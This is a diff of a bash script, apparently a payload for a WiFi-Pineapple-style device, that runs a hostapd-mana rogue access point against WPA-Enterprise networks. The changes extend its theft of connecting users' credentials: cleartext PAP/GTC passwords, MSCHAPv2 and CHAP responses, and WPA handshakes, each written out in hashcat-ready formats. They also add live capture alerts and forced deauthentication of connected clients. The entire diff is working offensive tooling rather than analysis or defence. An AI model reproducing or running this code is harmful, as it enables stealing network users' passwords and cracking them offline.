     local mana_hashes_file="$staging_dir/hashcat_5500.mana"
     local mana_cleartext_file="$staging_dir/mana_cleartext_creds.tsv"
     local mana_mschapv2_file="$staging_dir/mana_mschapv2.tsv"
     local mana_chap_file="$staging_dir/mana_chap.tsv"
     local sessions_file="$staging_dir/eap_sessions.tsv"
+    local tls_evidence_file="$staging_dir/tls_evidence.txt"
     local result_name
+
+    # The Pager watchdog can interrupt harvesting. Keep temporary parse output
+    # scoped to this subshell so all ordinary exits and catchable signals remove
+    # it rather than leaving a hidden work directory behind.
+    trap 'remove_parse_staging "$staging_dir"' EXIT HUP INT TERM
 
     IDENTITY_COUNT=0
     CLEARTEXT_COUNT=0
     MSCHAPV2_COUNT=0
+    CHAP_COUNT=0
+    WPA2_HASH_COUNT=0
+    TLS_EVIDENCE_COUNT=0
 
     if [ ! -f "$log_file" ]; then
         return 1
     fi
 
+    mkdir -p "$staging_root" || return 1
+    cleanup_stale_parse_staging "$staging_root"
     mkdir -p "$staging_dir" || return 1
-    rm -f "$staging_dir"/identities.txt "$staging_dir"/cleartext_creds.tsv \
+    rm -f "$staging_dir"/identities.txt "$staging_dir"/cleartext.txt \
         "$staging_dir"/mschapv2_raw.tsv "$staging_dir"/hashcat_5500.txt \
+        "$staging_dir"/hashcat_4800.txt "$staging_dir"/hashcat_22000.txt \
         "$staging_dir"/hashcat_5500.debug "$staging_dir"/hashcat_5500.mana \
         "$staging_dir"/mana_cleartext_creds.tsv "$staging_dir"/mana_mschapv2.tsv \
-        "$staging_dir"/mana_chap.tsv "$staging_dir"/eap_sessions.tsv
+        "$staging_dir"/mana_chap.tsv "$staging_dir"/eap_sessions.tsv \
+        "$staging_dir"/tls_evidence.txt
 
     # --- EAP Identities (usernames) ---
     # Includes outer/phase-2 identities and typical hostapd ASCII dumps.
@@ -3575,14 +3913,19 @@ parse_credentials() {
     # --- Context-qualified GTC/PAP cleartext ---
     {
         printf 'method\tusername\tpassword\n'
-        extract_mana_cleartext "$MANA_CREDOUT"
+        {
+            extract_mana_cleartext "$MANA_CREDOUT"
+            extract_mana_cleartext_hostapd "$log_file"
+        } | sort -u
     } > "$mana_cleartext_file"
 
     {
         extract_contextual_cleartext "$log_file"
-        extract_mana_cleartext "$MANA_CREDOUT" |
-            awk -F '\t' '{ print $1 "\t" $2 ":" $3 }'
-    } | sort -u > "$cleartext_file" 2>/dev/null
+        {
+            extract_mana_cleartext "$MANA_CREDOUT"
+            extract_mana_cleartext_hostapd "$log_file"
+        } | awk -F '\t' '{ print $1 "\t" $2 ":" $3 }'
+    } | format_cleartext_records | sort -u > "$cleartext_file" 2>/dev/null
 
     CLEARTEXT_COUNT=$(wc -l < "$cleartext_file" 2>/dev/null | tr -d ' ')
     [ -z "$CLEARTEXT_COUNT" ] && CLEARTEXT_COUNT=0
@@ -3756,53 +4099,189 @@ parse_credentials() {
 
     {
         printf 'method\tusername\thash\tsalt\tid\n'
-        extract_mana_chap "$MANA_CREDOUT"
+        {
+            extract_mana_chap "$MANA_CREDOUT"
+            extract_mana_chap_hostapd "$log_file"
+        } | sort -u
     } > "$mana_chap_file"
+
+    sed '1d' "$mana_chap_file" | chap_records_to_hashcat_4800 | sort -u > "$hashcat_chap_file"
+    extract_mana_hashcat_22000_hostapd "$log_file" | sort -u > "$hashcat_wpa_file"
 
     MSCHAPV2_COUNT=$(wc -l < "$hashcat_file" 2>/dev/null | tr -d ' ')
     [ -z "$MSCHAPV2_COUNT" ] && MSCHAPV2_COUNT=0
+    CHAP_COUNT=$(sed '1d' "$mana_chap_file" 2>/dev/null | sed '/^$/d' | wc -l | tr -d ' ')
+    [ -z "$CHAP_COUNT" ] && CHAP_COUNT=0
+    WPA2_HASH_COUNT=$(wc -l < "$hashcat_wpa_file" 2>/dev/null | tr -d ' ')
+    [ -z "$WPA2_HASH_COUNT" ] && WPA2_HASH_COUNT=0
+
+    extract_tls_evidence "$log_file" | sort -u > "$tls_evidence_file"
+    TLS_EVIDENCE_COUNT=$(wc -l < "$tls_evidence_file" 2>/dev/null | tr -d ' ')
+    [ -z "$TLS_EVIDENCE_COUNT" ] && TLS_EVIDENCE_COUNT=0
 
     parse_eap_sessions "$log_file" "$sessions_file"
 
-    for result_name in identities.txt cleartext_creds.tsv mschapv2_raw.tsv \
-        hashcat_5500.txt mana_cleartext_creds.tsv mana_mschapv2.tsv \
-        mana_chap.tsv eap_sessions.tsv; do
-        chmod 600 "$staging_dir/$result_name" 2>/dev/null
-        mv "$staging_dir/$result_name" "$output_dir/$result_name" || return 1
+    for result_name in cleartext.txt hashcat_5500.txt hashcat_4800.txt hashcat_22000.txt; do
+        if [ -s "$staging_dir/$result_name" ]; then
+            chmod 600 "$staging_dir/$result_name" 2>/dev/null
+            if ! mv "$staging_dir/$result_name" "$output_dir/$result_name"; then
+                remove_parse_staging "$staging_dir"
+                return 1
+            fi
+        else
+            rm -f "$output_dir/$result_name"
+        fi
     done
-    rm -f "$debug_hashcat_file" "$mana_hashes_file"
-    rmdir "$staging_dir" 2>/dev/null
+    rm -f "$identities_file" "$mschapv2_file" "$debug_hashcat_file" \
+        "$mana_hashes_file" "$mana_cleartext_file" "$mana_mschapv2_file" \
+        "$mana_chap_file" "$sessions_file" "$tls_evidence_file"
+    remove_parse_staging "$staging_dir"
 
     return 0
-}
+)
 
 # ============================================
 # LIVE MONITORING
 # ============================================
 
+detect_outer_eap_method() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        /EAP Response-PEAP/ { print "PEAP"; exit }
+        /EAP Response-TTLS/ { print "TTLS"; exit }
+        /EAP Response-FAST/ { print "FAST"; exit }
+        /EAP Response-TLS/ { print "EAP-TLS"; exit }
+        /EAP Response-MD5/ { print "EAP-MD5"; exit }
+        /EAP Response-MSCHAPV2/ { print "EAP-MSCHAPv2"; exit }
+        /EAP Response-GTC|EAP-GTC/ { print "EAP-GTC"; exit }
+    ' "$log_file"
+}
+
+detect_inner_eap_method() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        /TTLS[-\/]PAP/ { print "PAP"; exit }
+        /TTLS[-\/]CHAP/ { print "CHAP"; exit }
+        /TTLS[-\/]MSCHAPV2/ { print "MSCHAPv2"; exit }
+        /TTLS[-\/]MSCHAP/ { print "MSCHAPv1"; exit }
+        /[Pp]hase 2.*EAP-MSCHAPV2|[Pp]hase 2.*MSCHAPV2/ { print "MSCHAPv2"; exit }
+        /[Pp]hase 2.*EAP-MD5/ { print "EAP-MD5"; exit }
+        /[Pp]hase 2.*EAP-GTC|[Pp]hase 2.*[^A-Za-z]GTC[^A-Za-z]/ { print "EAP-GTC"; exit }
+    ' "$log_file"
+}
+
+eap_negotiation_label() {
+    local outer_method="$1"
+    local inner_method="$2"
+
+    if [ -n "$outer_method" ] && [ -n "$inner_method" ]; then
+        printf '%s -> %s' "$outer_method" "$inner_method"
+    elif [ -n "$outer_method" ]; then
+        printf '%s' "$outer_method"
+    else
+        printf '%s' "not established"
+    fi
+}
+
+live_event_stream() {
+    local log_file="$1"
+    [ -f "$log_file" ] || return 0
+
+    awk '
+        function station_mac(    i, value) {
+            for (i = 1; i <= NF; i++) {
+                value = $i
+                gsub(/^[^0-9A-Fa-f]*/, "", value)
+                gsub(/[^0-9A-Fa-f:].*$/, "", value)
+                if (value ~ /^[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]$/)
+                    return tolower(value)
+            }
+            return ""
+        }
+        /IEEE 802\.11: associated \(aid/ { print "ASSOCIATED\t" station_mac() }
+        /CTRL-EVENT-EAP-STARTED/ { print "EAP_STARTED" }
+        /CTRL-EVENT-EAP-PROPOSED-METHOD/ {
+            method = $0
+            sub(/.*method=/, "", method)
+            if (method == "1") method = "Identity"
+            else if (method == "4") method = "EAP-MD5"
+            else if (method == "6") method = "EAP-GTC"
+            else if (method == "13") method = "EAP-TLS"
+            else if (method == "21") method = "EAP-TTLS"
+            else if (method == "25") method = "EAP-PEAP"
+            else if (method == "26") method = "EAP-MSCHAPv2"
+            else if (method == "43") method = "EAP-FAST"
+            else method = "type " method
+            print "PROPOSED\t" method
+        }
+        /EAP Response-Identity/ { print "IDENTITY" }
+        /EAP entering state NAK|EAP Response-NAK/ { print "NAK" }
+        /EAP Response-PEAP/ { outer = "PEAP"; print "OUTER\t" outer }
+        /EAP Response-TTLS/ { outer = "TTLS"; print "OUTER\t" outer }
+        /EAP Response-FAST/ { outer = "FAST"; print "OUTER\t" outer }
+        /EAP Response-TLS/ { outer = "EAP-TLS"; print "OUTER\t" outer }
+        /EAP Response-MD5/ { outer = "EAP-MD5"; print "OUTER\t" outer }
+        /EAP Response-MSCHAPV2/ { outer = "EAP-MSCHAPv2"; print "OUTER\t" outer }
+        /EAP Response-GTC/ { outer = "EAP-GTC"; print "OUTER\t" outer }
+        /TTLS[-\/]PAP/ { print "INNER\tPAP" }
+        /TTLS[-\/]CHAP/ { print "INNER\tCHAP" }
+        /TTLS[-\/]MSCHAPV2/ { print "INNER\tMSCHAPv2" }
+        /TTLS[-\/]MSCHAP([^V]|$)/ { print "INNER\tMSCHAPv1" }
+        /[Pp]hase 2.*EAP-MSCHAPV2|[Pp]hase 2.*MSCHAPV2/ { print "INNER\tMSCHAPv2" }
+        /[Pp]hase 2.*EAP-MD5/ { print "INNER\tEAP-MD5" }
+        /[Pp]hase 2.*EAP-GTC/ { print "INNER\tEAP-GTC" }
+        /MANA EAP (TTLS-)?MD5 HASHCAT user=.* \| / {
+            if (outer == "TTLS" || outer == "PEAP" || outer == "FAST") print "INNER\tEAP-MD5"
+            print "CHAP"
+        }
+        /MANA EAP .* HASHCAT \| / {
+            # TTLS-MSCHAP(v2) is already identified by its method-specific
+            # rules above. Only a literal EAP-MSCHAPv2 record denotes the EAP
+            # inner method; otherwise do not overwrite the precise label.
+            if ($0 ~ /MANA EAP EAP-MSCHAPV2 HASHCAT/ && \
+                (outer == "TTLS" || outer == "PEAP" || outer == "FAST")) print "INNER\tEAP-MSCHAPv2"
+            print "MSCHAPV2"
+        }
+        /MANA EAP .* \| / && $0 !~ /(ASLEAP|JTR|HASHCAT)/ {
+            line = $0
+            sub(/.*MANA EAP /, "", line)
+            method = line
+            sub(/ \|.*/, "", method)
+            if (method ~ /GTC/) print "CLEAR\tEAP-GTC"
+            else if (method ~ /PAP/) print "CLEAR\tPAP"
+        }
+        /CTRL-EVENT-EAP-SUCCESS/ { print "SUCCESS" }
+        /CTRL-EVENT-EAP-FAILURE/ { print "FAILURE" }
+        /AP-STA-CONNECTED/ { print "CONNECTED\t" tolower($NF) }
+        /AP-STA-DISCONNECTED/ { print "DISCONNECTED\t" tolower($NF) }
+    ' "$log_file"
+}
+
+deauthorize_connected_station() {
+    local station="$1"
+    case "$station" in
+        [0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]) ;;
+        *) return 1 ;;
+    esac
+
+    # MANA can accept some PAP/GTC paths after recording them. Ask hostapd,
+    # which owns this AP station table, to send the deauthentication frame and
+    # remove this client; `iw station del` does not reliably do this for APs.
+    hostapd_cli -p "$HOSTAPD_CTRL_DIR" -i "$PINEAPOL_IFACE" \
+        deauthenticate "$station" 3 >/dev/null 2>> "${SESSION_LOG:-/dev/null}"
+}
+
 log_eap_failure_diagnostics() {
     local failure_number="$1"
-    local reason="EAP exchange failed"
-
-    if grep -q 'Supplicant used different EAP type' "$HOSTAPD_LOG" 2>/dev/null; then
-        reason="Supplicant EAP type mismatch"
-    elif grep -Ei '(^|[^A-Za-z])NAK([^A-Za-z]|$)' "$HOSTAPD_LOG" >/dev/null 2>&1; then
-        reason="EAP NAK received"
-    elif grep -Ei 'Phase 2.*(fail|error)|failed.*Phase 2' "$HOSTAPD_LOG" >/dev/null 2>&1; then
-        reason="PEAP phase 2 failed"
-    elif grep -Ei 'EAP-MSCHAPV2|MSCHAPV2' "$HOSTAPD_LOG" >/dev/null 2>&1; then
-        reason="MSCHAPv2 exchange failed"
-    fi
-
-    logboth red "EAP failure #$failure_number: $reason"
-
-    # Preserve a small, relevant diagnostic trail in the session log. The full
-    # Unmodified -ddd -K output remains in HOSTAPD_LOG and is copied at harvest.
-    if [ -n "$SESSION_LOG" ]; then
-        echo "$(date '+%H:%M:%S') EAP diagnostic context:" >> "$SESSION_LOG"
-        grep -Ei 'CTRL-EVENT-EAP-FAILURE|EAP Response-(PEAP|TTLS|FAST|TLS|MD5)|EAP-(PEAP|TTLS|FAST|TLS|GTC|MSCHAPV2)|MSCHAPV2|PAP|NAK|Phase 2|method|Supplicant used different EAP type|SSL:' \
-            "$HOSTAPD_LOG" 2>/dev/null | tail -n 12 >> "$SESSION_LOG"
-    fi
+    local negotiation="$2"
+    # A monitor delta can hold multiple client attempts. Do not infer a reason
+    # from adjacent teardown text and attribute another attempt's method to this
+    # one. The complete hostapd log remains available for diagnosis.
+    logboth red "EAP failure #$failure_number: authentication exchange failed ($negotiation)"
 }
 
 live_monitor() {
@@ -3821,10 +4300,24 @@ live_monitor() {
     local seen_identities=""
     local seen_mschap_hashes=""
     local seen_cleartext_records=""
+    local seen_chap_records=""
+    local seen_wpa_hashes=""
+    local seen_tls_evidence=""
     local failure_count=0
     local success_count=0
-    local outer_method_logged=0
-    local mschap_logged=0
+    local pending_no_material_success=0
+    local nak_count=0
+    local association_count=0
+    local disassociation_count=0
+    local observed_outer_method=""
+    local observed_inner_method=""
+    local partial_log_line=""
+    local pending_mschap_notice=0
+    local pending_chap_notice=0
+    local pending_cleartext_notice=0
+    local pending_mschap_since=0
+    local pending_chap_since=0
+    local pending_cleartext_since=0
 
     while true; do
         # Check for stop
@@ -3835,10 +4328,10 @@ live_monitor() {
 
         loop_count=$((loop_count + 1))
 
-        # The live path runs every ~1 second and examines only the newly written
-        # tail (plus a small overlap for a line caught mid-write). Full parsing
-        # is deliberately deferred until hostapd has stopped.
-        if [ $((loop_count % 2)) -eq 0 ] && [ -f "$HOSTAPD_LOG" ]; then
+        # Examine the growing log on every half-second UI cycle. Keep an
+        # unfinished final line in memory until hostapd terminates it, so each
+        # complete log line is processed exactly once and in source order.
+        if [ -f "$HOSTAPD_LOG" ]; then
             local current_size
             current_size=$(wc -c < "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
             [ -z "$current_size" ] && current_size=0
@@ -3848,17 +4341,35 @@ live_monitor() {
             fi
 
             if [ "$current_size" -gt "$last_log_size" ]; then
-                local delta_start=1
+                local delta_start=$((last_log_size + 1))
                 local delta_file="$SESSION_WORK_DIR/live-hostapd.delta"
-                if [ "$last_log_size" -gt 1024 ]; then
-                    delta_start=$((last_log_size - 1023))
-                fi
-                tail -c "+$delta_start" "$HOSTAPD_LOG" > "$delta_file" 2>/dev/null
+                local raw_delta_file="$SESSION_WORK_DIR/live-hostapd.raw"
+                tail -c "+$delta_start" "$HOSTAPD_LOG" > "$raw_delta_file" 2>/dev/null
                 last_log_size="$current_size"
 
+                if [ -n "$partial_log_line" ]; then
+                    {
+                        printf '%s' "$partial_log_line"
+                        cat "$raw_delta_file"
+                    } > "$delta_file"
+                else
+                    cp "$raw_delta_file" "$delta_file"
+                fi
+
+                local final_byte
+                final_byte=$(tail -c 1 "$delta_file" 2>/dev/null | od -An -tu1 | tr -d ' ')
+                if [ -s "$delta_file" ] && [ "$final_byte" != "10" ]; then
+                    partial_log_line=$(tail -n 1 "$delta_file")
+                    sed '$d' "$delta_file" > "$delta_file.complete"
+                    mv "$delta_file.complete" "$delta_file"
+                else
+                    partial_log_line=""
+                fi
+
                 # Parse identities from the delta. The overlap and in-memory set
-                # make split lines safe without rescanning the complete log.
+                # keep result counters independent of the display event stream.
                 local parsed_identities
+                local new_identity_count=0
                 parsed_identities=$(extract_eap_identities "$delta_file" | sort -u)
                 while IFS= read -r new_id; do
                     [ -z "$new_id" ] && continue
@@ -3869,15 +4380,12 @@ live_monitor() {
                             seen_identities="$seen_identities
 $new_id"
                         fi
-                        logboth green "EAP Identity: $new_id"
-                        VIBRATE
-                        play_capture
+                        new_identity_count=$((new_identity_count + 1))
                     fi
                 done <<< "$parsed_identities"
 
                 IDENTITY_COUNT=$(printf '%s\n' "$seen_identities" | sed '/^$/d' | wc -l | tr -d ' ')
                 [ -z "$IDENTITY_COUNT" ] && IDENTITY_COUNT=0
-                publish_unique_lines_atomic "$SESSION_RESULTS_DIR/identities.txt" "$seen_identities"
 
                 # MANA prints a complete, already-derived Hashcat record before
                 # attempting password verification. Detect those exact records
@@ -3902,17 +4410,74 @@ $new_hash"
                 if [ "$new_hash_count" -gt 0 ]; then
                     publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_5500.txt" "$seen_mschap_hashes"
                     MSCHAPV2_COUNT=$(printf '%s\n' "$seen_mschap_hashes" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
-                    logboth yellow "Complete MSCHAPv2 response captured!"
-                    VIBRATE
-                    play_capture
+                    pending_mschap_notice=$((pending_mschap_notice + new_hash_count))
+                    [ "$pending_mschap_since" -gt 0 ] || pending_mschap_since="$loop_count"
                 fi
 
-                # The dedicated MANA file is small, so retaining live GTC/PAP
-                # reporting does not reintroduce full debug-log parsing.
+                # MD5 and the TTLS legacy CHAP variants use a different MANA
+                # record format from MSCHAPv2. Keep their normalized records in
+                # the session results as soon as hostapd prints them.
+                local parsed_chap
+                local new_chap_count=0
+                local chap_record
+                parsed_chap=$(extract_mana_chap_hostapd "$delta_file" | sort -u)
+                while IFS= read -r chap_record; do
+                    [ -n "$chap_record" ] || continue
+                    if ! printf '%s\n' "$seen_chap_records" | grep -Fxq "$chap_record"; then
+                        if [ -z "$seen_chap_records" ]; then
+                            seen_chap_records="$chap_record"
+                        else
+                            seen_chap_records="$seen_chap_records
+$chap_record"
+                        fi
+                        new_chap_count=$((new_chap_count + 1))
+                    fi
+                done <<< "$parsed_chap"
+
+                if [ "$new_chap_count" -gt 0 ]; then
+                    local live_hashcat_chap
+                    live_hashcat_chap=$(printf '%s\n' "$seen_chap_records" | chap_records_to_hashcat_4800)
+                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_4800.txt" "$live_hashcat_chap"
+                    CHAP_COUNT=$(printf '%s\n' "$seen_chap_records" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
+                    pending_chap_notice=$((pending_chap_notice + new_chap_count))
+                    [ "$pending_chap_since" -gt 0 ] || pending_chap_since="$loop_count"
+                fi
+
+                # A completed WPA-EAP connection can yield a native Hashcat
+                # 22000 WPA record. Preserve it as soon as MANA writes it.
+                local parsed_wpa_hashes
+                local new_wpa_hash_count=0
+                local new_wpa_hash
+                parsed_wpa_hashes=$(extract_mana_hashcat_22000_hostapd "$delta_file" | sort -u)
+                while IFS= read -r new_wpa_hash; do
+                    [ -n "$new_wpa_hash" ] || continue
+                    if ! printf '%s\n' "$seen_wpa_hashes" | grep -Fxq "$new_wpa_hash"; then
+                        if [ -z "$seen_wpa_hashes" ]; then
+                            seen_wpa_hashes="$new_wpa_hash"
+                        else
+                            seen_wpa_hashes="$seen_wpa_hashes
+$new_wpa_hash"
+                        fi
+                        new_wpa_hash_count=$((new_wpa_hash_count + 1))
+                    fi
+                done <<< "$parsed_wpa_hashes"
+                if [ "$new_wpa_hash_count" -gt 0 ]; then
+                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_22000.txt" "$seen_wpa_hashes"
+                    WPA2_HASH_COUNT=$(printf '%s\n' "$seen_wpa_hashes" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
+                fi
+
+                # Consume both the immediate MANA output and the credential
+                # file. The former is the primary live path; the latter covers
+                # builds that do not flush their stdout plaintext callback.
                 local parsed_cleartext
                 local new_cleartext_count=0
                 local cleartext_record
-                parsed_cleartext=$(extract_mana_cleartext "$MANA_CREDOUT" | sort -u)
+                parsed_cleartext=$(
+                    {
+                        extract_mana_cleartext_hostapd "$delta_file"
+                        extract_mana_cleartext "$MANA_CREDOUT"
+                    } | sort -u
+                )
                 while IFS= read -r cleartext_record; do
                     [ -n "$cleartext_record" ] || continue
                     if ! printf '%s\n' "$seen_cleartext_records" | grep -Fxq "$cleartext_record"; then
@@ -3929,63 +4494,194 @@ $cleartext_record"
                 if [ "$new_cleartext_count" -gt 0 ]; then
                     local live_cleartext
                     live_cleartext=$(printf '%s\n' "$seen_cleartext_records" | \
-                        awk -F '\t' 'NF >= 3 { print $1 "\t" $2 ":" $3 }')
-                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/cleartext_creds.tsv" "$live_cleartext"
+                        awk -F '\t' 'NF >= 3 { print $1 "\t" $2 ":" $3 }' | \
+                        format_cleartext_records)
+                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/cleartext.txt" "$live_cleartext"
                     CLEARTEXT_COUNT=$(printf '%s\n' "$live_cleartext" | sed '/^$/d' | wc -l | tr -d ' ')
-                    logboth green "CLEARTEXT PASSWORD CAPTURED!"
-                    VIBRATE
-                    VIBRATE
-                    play_capture
+                    pending_cleartext_notice=$((pending_cleartext_notice + new_cleartext_count))
+                    [ "$pending_cleartext_since" -gt 0 ] || pending_cleartext_since="$loop_count"
                 fi
 
-                if [ "$outer_method_logged" -eq 0 ]; then
-                    local observed_outer_method
-                    observed_outer_method=$(awk '
-                        /EAP Response-PEAP/ { method = "PEAP" }
-                        /EAP Response-TTLS/ { method = "TTLS" }
-                        /EAP Response-FAST/ { method = "FAST" }
-                        /EAP Response-TLS/  { method = "TLS" }
-                        /EAP Response-MD5/  { method = "MD5" }
-                        END { print method }
-                    ' "$delta_file")
-                    if [ -n "$observed_outer_method" ]; then
-                        outer_method_logged=1
-                        logboth blue "$observed_outer_method negotiation observed"
+                local parsed_tls_evidence
+                local tls_evidence_line
+                parsed_tls_evidence=$(extract_tls_evidence "$delta_file" | sort -u)
+                while IFS= read -r tls_evidence_line; do
+                    [ -n "$tls_evidence_line" ] || continue
+                    if ! printf '%s\n' "$seen_tls_evidence" | grep -Fxq "$tls_evidence_line"; then
+                        if [ -z "$seen_tls_evidence" ]; then
+                            seen_tls_evidence="$tls_evidence_line"
+                        else
+                            seen_tls_evidence="$seen_tls_evidence
+$tls_evidence_line"
+                        fi
                     fi
-                fi
+                done <<< "$parsed_tls_evidence"
+                TLS_EVIDENCE_COUNT=$(printf '%s\n' "$seen_tls_evidence" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
+                [ -z "$TLS_EVIDENCE_COUNT" ] && TLS_EVIDENCE_COUNT=0
 
-                if [ "$mschap_logged" -eq 0 ] && grep -Ei 'EAP-MSCHAPV2|MSCHAPV2' "$delta_file" >/dev/null 2>&1; then
-                    mschap_logged=1
-                    logboth blue "MSCHAPv2 phase 2 observed"
-                fi
-
-                local new_success_count
-                new_success_count=$(grep -c 'CTRL-EVENT-EAP-SUCCESS' "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
-                [ -z "$new_success_count" ] && new_success_count=0
-                if [ "$new_success_count" -gt "$success_count" ]; then
-                    success_count="$new_success_count"
-                    logboth green "EAP authentication succeeded"
-                    VIBRATE
-                    play_capture
-                fi
-
-                local new_failure_count
-                new_failure_count=$(grep -c 'CTRL-EVENT-EAP-FAILURE' "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
-                [ -z "$new_failure_count" ] && new_failure_count=0
-                if [ "$new_failure_count" -gt "$failure_count" ]; then
-                    failure_count="$new_failure_count"
-                    log_eap_failure_diagnostics "$failure_count"
-                fi
+                # Emit one display event at a time, in the exact order that
+                # hostapd wrote the completed log lines. Result parsing above
+                # deliberately remains separate so it can retain its strict
+                # record validation and atomic publication behaviour.
+                local event_type event_detail negotiation
+                while IFS=$'\t' read -r event_type event_detail; do
+                    case "$event_type" in
+                        ASSOCIATED)
+                            logboth blue "Client associated; starting EAP"
+                            ;;
+                        EAP_STARTED)
+                            observed_outer_method=""
+                            observed_inner_method=""
+                            logboth blue "EAP authentication started"
+                            ;;
+                        PROPOSED)
+                            logboth blue "EAP method proposed: $event_detail"
+                            ;;
+                        IDENTITY)
+                            if [ "$new_identity_count" -gt 0 ]; then
+                                logboth green "EAP identity received (redacted)"
+                                new_identity_count=$((new_identity_count - 1))
+                                VIBRATE
+                                play_capture
+                            fi
+                            ;;
+                        OUTER)
+                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_outer_method" ]; then
+                                observed_outer_method="$event_detail"
+                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                                logboth blue "EAP negotiation: $negotiation"
+                            fi
+                            ;;
+                        INNER)
+                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_inner_method" ]; then
+                                observed_inner_method="$event_detail"
+                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                                logboth blue "EAP negotiation: $negotiation"
+                            fi
+                            ;;
+                        NAK)
+                            nak_count=$((nak_count + 1))
+                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                            logboth yellow "Client rejected an EAP method (NAK; $negotiation)"
+                            ;;
+                        MSCHAPV2)
+                            if [ "$pending_mschap_notice" -gt 0 ]; then
+                                logboth yellow "Complete MSCHAPv2 response captured!"
+                                pending_mschap_notice=$((pending_mschap_notice - 1))
+                                [ "$pending_mschap_notice" -gt 0 ] || pending_mschap_since=0
+                                pending_no_material_success=0
+                                VIBRATE
+                                play_capture
+                            fi
+                            ;;
+                        CHAP)
+                            if [ "$pending_chap_notice" -gt 0 ]; then
+                                logboth yellow "Legacy MD5/CHAP response captured!"
+                                pending_chap_notice=$((pending_chap_notice - 1))
+                                [ "$pending_chap_notice" -gt 0 ] || pending_chap_since=0
+                                pending_no_material_success=0
+                                VIBRATE
+                                play_capture
+                            fi
+                            ;;
+                        CLEAR)
+                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_inner_method" ]; then
+                                observed_inner_method="$event_detail"
+                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                                logboth blue "EAP negotiation: $negotiation"
+                            fi
+                            if [ "$pending_cleartext_notice" -gt 0 ]; then
+                                logboth green "CLEARTEXT PASSWORD CAPTURED!"
+                                pending_cleartext_notice=$((pending_cleartext_notice - 1))
+                                [ "$pending_cleartext_notice" -gt 0 ] || pending_cleartext_since=0
+                                pending_no_material_success=0
+                                VIBRATE
+                                VIBRATE
+                                play_capture
+                            fi
+                            ;;
+                        SUCCESS)
+                            success_count=$((success_count + 1))
+                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                            logboth green "EAP authentication succeeded ($negotiation)"
+                            if [ "$observed_outer_method" = "EAP-TLS" ]; then
+                                logboth yellow "No password material expected: EAP-TLS certificate authentication"
+                            elif [ "$CLEARTEXT_COUNT" -eq 0 ] && [ "$MSCHAPV2_COUNT" -eq 0 ] && [ "$CHAP_COUNT" -eq 0 ]; then
+                                pending_no_material_success="$loop_count"
+                            fi
+                            VIBRATE
+                            play_capture
+                            ;;
+                        FAILURE)
+                            failure_count=$((failure_count + 1))
+                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
+                            log_eap_failure_diagnostics "$failure_count" "$negotiation"
+                            ;;
+                        CONNECTED)
+                            association_count=$((association_count + 1))
+                            logboth green "Client authorized/connected (total: $association_count)"
+                            if deauthorize_connected_station "$event_detail"; then
+                                logboth yellow "Client immediately deauthorized; AP access remains disabled"
+                            else
+                                logboth red "Could not immediately deauthorize connected client; inspect hostapd log"
+                            fi
+                            ;;
+                        DISCONNECTED)
+                            disassociation_count=$((disassociation_count + 1))
+                            logboth blue "Client disconnected (total: $disassociation_count)"
+                            ;;
+                    esac
+                done < <(live_event_stream "$delta_file")
             fi
+        fi
+
+        # mana_credout can flush independently of hostapd stdout. Prefer the
+        # ordered stdout event above, but do not lose a notification when that
+        # counterpart is absent or arrives late.
+        if [ "$pending_mschap_notice" -gt 0 ] && \
+           [ $((loop_count - pending_mschap_since)) -ge 2 ]; then
+            logboth yellow "Complete MSCHAPv2 response captured!"
+            pending_mschap_notice=$((pending_mschap_notice - 1))
+            [ "$pending_mschap_notice" -gt 0 ] || pending_mschap_since=0
+            pending_no_material_success=0
+            VIBRATE
+            play_capture
+        fi
+        if [ "$pending_chap_notice" -gt 0 ] && \
+           [ $((loop_count - pending_chap_since)) -ge 2 ]; then
+            logboth yellow "Legacy MD5/CHAP response captured!"
+            pending_chap_notice=$((pending_chap_notice - 1))
+            [ "$pending_chap_notice" -gt 0 ] || pending_chap_since=0
+            pending_no_material_success=0
+            VIBRATE
+            play_capture
+        fi
+        if [ "$pending_cleartext_notice" -gt 0 ] && \
+           [ $((loop_count - pending_cleartext_since)) -ge 2 ]; then
+            logboth green "CLEARTEXT PASSWORD CAPTURED!"
+            pending_cleartext_notice=$((pending_cleartext_notice - 1))
+            [ "$pending_cleartext_notice" -gt 0 ] || pending_cleartext_since=0
+            pending_no_material_success=0
+            VIBRATE
+            VIBRATE
+            play_capture
+        fi
+
+        if [ "$pending_no_material_success" -gt 0 ] && \
+           [ $((loop_count - pending_no_material_success)) -ge 8 ]; then
+            logboth yellow "No credential material observed after EAP success; raw session logs retained"
+            pending_no_material_success=0
         fi
 
         # Status update every ~10 seconds
         if [ $((loop_count % 20)) -eq 0 ]; then
             local uptime=$((loop_count / 2))
+            local status_negotiation
